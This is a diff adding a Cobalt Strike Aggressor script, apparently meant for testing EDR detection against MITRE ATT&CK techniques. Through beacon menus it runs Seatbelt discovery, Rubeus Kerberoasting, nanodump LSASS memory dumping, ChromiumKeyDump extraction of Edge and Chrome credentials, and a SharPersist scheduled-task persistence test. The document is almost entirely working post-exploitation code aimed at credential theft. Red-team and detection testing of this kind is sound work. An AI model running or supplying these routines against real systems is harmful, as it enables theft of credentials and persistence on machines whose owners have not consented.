@@ -1,0 +1,110 @@
+# This is a custom Aggressor script for Cobalt Strike
+# MITRE EDR Testing
+# Version = "version 0.1"
+# V0.1: Date Created 06/20/2022
+# Date of last modification: 06/22/2022
+# Initial Author: @_mnigma_
+
+
+# MITRE ATT&CK
+
+popup beacon_top {
+    menu "EDR MITRE TEST" {
+        menu "Discovery - User" {
+            item "T1082 - System Information Discovery" {
+                btask($1, "Executing T1082 - System Information Discovery (BOFNET+SeatBelt), might take a few minutes to complete.");
+                RunUT1082($1);
+            }
+        }
+        menu "Credential Access - User" {
+            item "T1558.003 - Kerberoasting" {
+                btask($1, "Executing T1558.003 - Kerberoasting (BOFNET+Rubeus)");
+                RunUT1558.003($1);
+            }
+            item "T1555.003 - Credentials from Web Browsers" {
+                btask($1, "Executing T1555.003 - Credentials from Password Stores: Credentials from Web Browsers (BOF: ChromiumKeyDump).");
+                RunUT1555.003($1);
+            }
+        }
+        menu "Credential Access - Admin" {
+            item "T1003.001 - OS Credential Dumping: LSASS Memory" {
+                btask($1, "Executing T1003.001 - OS Credential Dumping: LSASS Memory (BOF: nanodump).");
+                RunAT1003.001($1);
+            }
+        }
+        menu "Persistence - User" {
+            item "T1053.005 - Scheduled Task/Job: Scheduled Task" {
+                btask($1, "Executing T1053.005 - Scheduled Task/Job: Scheduled Task (BOFNET+SharPersist).");
+                RunUT1053.005($1);
+            }
+        }
+    }
+}
+
+#SeatBelt
+
+#SeatBelt UT Checks
+sub RunUT1082{
+    local ('$bid');
+		foreach $bid ($1){
+            $seatbeltPath = script_resource('Seatbelt.exe');
+            fireAlias($bid, "bofnet_init", "1");
+            fireAlias($bid, "bofnet_load", $seatbeltPath);
+            fireAlias($bid, "bofnet_executeassembly", "Seatbelt -group=all");
+            fireAlias($bid, "bofnet_shutdown", '');
+        }
+    
+}
+
+#Rubeus UT Kerberoasting
+sub RunUT1558.003{
+    local ('$bid');
+		foreach $bid ($1){
+            $rubeusPath = script_resource('Rubeus.exe');
+            fireAlias($bid, "bofnet_init", '');
+            fireAlias($bid, "bofnet_load", $rubeusPath);
+            fireAlias($bid, "bofnet_executeassembly", "Rubeus kerberoast");
+            fireAlias($bid, "bofnet_shutdown", '');
+        }
+    
+}
+
+#LSASS dump using nanodump AT
+sub RunAT1003.001{
+    local ('$bid');
+		foreach $bid ($1){
+            if (-isadmin $1['$bid']) {
+                fireAlias($bid, "nanodump", '');
+        }
+        else {
+            berror($1, "You need elevated privileges for this action.");
+        }
+    }
+}
+
+#Persistence via scheduled task using bofnet+sharpersist UT
+sub RunUT1053.005{
+    local ('$bid');
+		foreach $bid ($1){
+            $sharpersistPath = script_resource('SharPersist.exe');
+            fireAlias($bid, "bofnet_init", '');
+            fireAlias($bid, "bofnet_load", $sharpersistPath);
+            fireAlias($bid, "bofnet_executeassembly", 'SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 >> c:\123.txt" -n "Some Task" -m add -o hourly');
+            btask($1, "Added a scheduled task, now sleep for 5 seconds and cleanup.")
+            bpause($1, int(5000));
+            fireAlias($bid, "bofnet_executeassembly", 'SharPersist -t schtask -n "Some Task" -m remove');
+            fireAlias($bid, "bofnet_shutdown", '');
+        }
+    
+}
+
+
+#Extract credentials from Edge and Chrome web browsers UT
+sub RunUT1555.003{
+    local ('$bid');
+		foreach $bid ($1){
+            fireAlias($bid, "chromiumkeydump", 'edge all');
+            fireAlias($bid, "chromiumkeydump", 'chrome all');
+        }
+    
+}
